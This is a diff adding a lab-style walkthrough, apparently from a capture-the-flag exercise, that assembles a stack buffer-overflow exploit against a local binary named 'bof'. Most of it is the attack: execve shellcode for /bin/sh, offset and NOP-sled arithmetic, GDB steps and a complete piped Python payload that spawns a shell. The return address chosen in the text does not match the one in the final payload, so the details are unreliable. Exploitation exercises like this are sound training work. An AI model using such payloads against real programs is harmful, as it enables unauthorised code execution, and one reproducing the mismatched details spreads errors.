@@ -1,0 +1,55 @@
+#####STEPS#####
+We are provided with the final payload already: 
+
+
+(python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number)
++(return address))";cat) | ./bof
+
+We just need to  fill in the relevant bits:
+
+Shellcode = \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05 (Already given)
+
+Offset  = 616 ( 608 + RBP) ( calculated using msfvenom using pattern_create.rb and offset.rb )
+
+Shellcode length can be calculated using a simple python script: 
+
+shellcode = [insert shellcode] 
+
+shellcode_length = len(shellcode)
+
+print(shellcode_length)
+
+Shellcode length = 24 
+
+We can use a large NOP sled at the start lets say 400 
+
+NOP = 400 
+
+Now we just need to ensure our payload runs up to 616 bytes followed by our return address. 
+
+A = 192 (616 - (24+ 400))
+
+We can write what we have so far to a file: python -c "print('\x90'*400 + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'A'*192)"  > output
+
+We can point the return address to any address that is filled with NOPs, to do this we run GDB on the file
+1. run < output
+
+2. x/616xg $rsp - 620 
+
+We can now pick a NOP address of our choosing. I picked 0x7fffffffe304
+
+Ret_Address = 0x7fffffffe304 = \x04\xe3\xff\xff\xff\x7f\x00\x00 (little endian format)
+
+Now its just a case of substituting in everything we have and running it to get the shell.
+
+Our final payload should look like this: 
+
+(python -c "print('\x90'*400 + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'A'*192 + '\x7c\xe3\xff\xff\xff\x7f\x00\x00')" ; cat ) | ./bof
+
+
+
+
+
+
+
+
